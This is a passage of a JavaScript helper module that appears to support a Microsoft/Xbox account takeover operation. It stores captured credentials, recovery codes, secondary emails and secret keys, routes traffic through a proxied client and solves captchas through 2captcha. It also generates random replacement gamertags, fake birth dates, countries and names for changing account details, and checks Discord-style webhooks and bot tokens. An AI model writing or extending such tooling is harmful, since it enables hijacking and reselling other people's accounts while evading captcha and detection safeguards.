  console.log(`[${funcName}] took ${duration.toFixed(2)} seconds`);
}

async function initializesecure(uid, options = {}) {
  const { skipHttpClient = false } = options;

  try {
    await queryParams(
      `INSERT OR IGNORE INTO status (uid, msauth, username, email, secemail, password, recoverycode, multiplayer, oauths, secretkey) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [uid, null, null, null, null, null, null, null, null, null]
    );

    await queryParams(
      `INSERT OR IGNORE INTO extrainformation (uid, gtg, ogo) VALUES (?, ?, ?)`,
      [uid, null, null]
    );
  } catch (error) {
    console.error('Error initializing secure:', error);
  }

  if (skipHttpClient) {
    return null;
  }

  const axios = new HttpClient(true);      /// Proxied client
  return axios;
}

function isUrl(link) {
  try {
    new URL(link);
    return true;
  } catch {
    return false;
  }
}

async function isvalidwebhook(webhooklink) {
  try {
    const res = await axios.get(webhooklink);
    return res.status === 200;
  } catch {
    return false;
  }
}


function getRandomLetter() {
  const letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  return letters.charAt(Math.floor(Math.random() * letters.length));
}

const forbiddenWords = [
  'sex', 'ass', 'cum', 'fag', 'bitch', 'dam', 'dick', 'die', 'fuk', 'fux',
  'gay', 'god', 'hit', 'hoe', 'jap', 'jew', 'kik', 'kys', 'les', 'los',
  'mud', 'nig', 'pms', 'poo', 'rap', 'sht', 'sux', 'tit', 'twat', 'wop',
  'b00', 'b1t', 'b2t', 'b3t', 'b4t', 'b5t', 'b6t', 'b7t', 'b8t', 'b9t',
  'fat', 'fck', 'fic', 'fig', 'gag', 'goy', 'gun', 'hag', 'ham', 'hat',
  'hiv', 'lap', 'mad', 'man', 'mth', 'nag', 'pos', 'puk', 'pum', 'pun',
  'shh', 'sim', 'suk', 'tnt', 'vac', 'vag', 'vda', 'wtf', 'yid', 'zip',
  'zit', 'zuc', 'azz', 'bab', 'ban', 'bat', 'bed', 'bee', 'bib', 'big',
  'bin', 'bit', 'bog', 'bum', 'bus', 'but', 'cab', 'cad', 'cam', 'can',
  'cap', 'cat', 'cop', 'cut', 'dan', 'day', 'deb', 'den', 'dip', 'dog',
  'don', 'dot', 'dry', 'dug', 'dye', 'ear', 'eat', 'egg', 'elf', 'elk',
  'ell', 'emu', 'end', 'eon', 'era', 'far', 'fax', 'fed', 'few', 'fin',
  'fir', 'fit', 'fix', 'fly', 'fog', 'fox', 'fun', 'fur', 'gab', 'gad',
  'gal', 'gap', 'gas', 'gel', 'gem', 'get', 'gig', 'gin', 'got', 'gum',
  'gut', 'guy', 'gym', 'had', 'has', 'hay', 'hem', 'hen', 'her', 'hew',
  'hid', 'him', 'hip', 'his', 'hob', 'hog', 'hop', 'hot', 'how', 'hub',
  'hue', 'hug', 'huh', 'hum', 'hut', 'ice', 'icy'
];

function generateSuffix() {
  let suffix = '';
  for (let i = 0; i < 3; i++) {
    suffix += getRandomLetter();
  }
  return suffix;
}

function isForbidden(suffix) {
  return forbiddenWords.includes(suffix.toLowerCase());
}

function newgamertag(gamertag) {
  if (!gamertag || gamertag.length <= 3) {
    return generateValidGamertag();
  }
  let baseTag = gamertag.slice(0, -3);
  let randomSuffix;
  do {
    randomSuffix = generateSuffix();
  } while (isForbidden(randomSuffix));
  return baseTag + randomSuffix;
}

function getRandomLetterOrNumber() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  return chars.charAt(Math.floor(Math.random() * chars.length));
}

const blacklist = [
  'SEX', 'XXX', 'ASS', 'FUCK', 'SHIT', 'DAMN', 'BITCH', 'CRAP', 'PISS',
  'DICK', 'CUNT', 'COCK', 'TITS', 'SLUT', 'BASTARD', 'WHORE', 'NIGGER', 'FAG'
];

function containsBlacklistedWord(gt) {
  const upperGT = gt.toUpperCase();
  return blacklist.some(word => upperGT.includes(word));
}

function isValidGamertag(gt) {
  if (gt.length < 1 || gt.length > 15) return false;
  if (gt.startsWith(' ') || gt.endsWith(' ')) return false;
  if (/  /.test(gt)) return false;
  if (!/^[A-Z0-9 ]+$/i.test(gt)) return false;
  if (gt.trim().length === 0) return false;
  if (containsBlacklistedWord(gt)) return false;
  return true;
}

function generateValidGamertag() {
  const length = Math.floor(Math.random() * 15) + 1;
  let gt = '';
  while (gt.length < length) {
    gt += getRandomLetterOrNumber();
  }
  gt = gt.trim();

  if (!isValidGamertag(gt)) {
    return generateValidGamertag();
  }
  return gt;
}

async function submitCaptchaTo2Captcha(base64Image) {
  const form = new FormData();
  form.append('key', API_KEY);
  form.append('method', 'base64');
  form.append('body', base64Image);

  const res = await axios.post('http://2captcha.com/in.php', form, {
    headers: form.getHeaders()
  });

  if (res.data.startsWith('OK|')) {
    return res.data.split('|')[1];
  } else {
    throw new Error(`Submit captcha failed: ${res.data}`);
  }
}

async function getCaptchaResult(captchaId) {
  for (let i = 0; i < 24; i++) {
    await new Promise(resolve => setTimeout(resolve, 5000));
    const res = await axios.get(`http://2captcha.com/res.php?key=${API_KEY}&action=get&id=${captchaId}`);
    if (res.data === 'CAPCHA_NOT_READY') continue;
    if (res.data.startsWith('OK|')) {
      return res.data.split('|')[1];
    } else {
      throw new Error(`Get captcha result failed: ${res.data}`);
    }
  }
  throw new Error('Captcha solving timeout.');
}

function captchaImageToBase64(dataUrl) {
  return dataUrl.replace(/^data:image\/(png|jpeg);base64,/, '');
}


/*
ChangeInfo  helpers
*/


function getdobregion() {
    const day = Math.floor(Math.random() * 28) + 1;
    const month = Math.floor(Math.random() * 12) + 1;
    const year = Math.floor(Math.random() * (2007 - 1933 + 1)) + 1933;
    const isoCountry = countries2[Math.floor(Math.random() * countries2.length)];

    const dob = `${day}|${month}|${year}|${isoCountry}`;
    return dob;
}




function getname() {
    const first = faker.person.firstName();
    const last = faker.person.lastName();
    return `${first}|${last}`;
}


function getlangiso(){

}


















module.exports = {
  getAcc,
  updateStatus,
  updateExtraInformation,
  logDuration,
  initializesecure,
  newgamertag,
  generateValidGamertag,
  submitCaptchaTo2Captcha,
  captchaImageToBase64,
  getCaptchaResult,
  getdobregion,
  getname,
  isUrl,
  timeTracker,
  codeblock,
  getBotIdFromToken,
  checkofflinebots,
  isvalidwebhook,
  indianMap,
  getCountryCode2,
  getLanguageCode,
  languageData
};
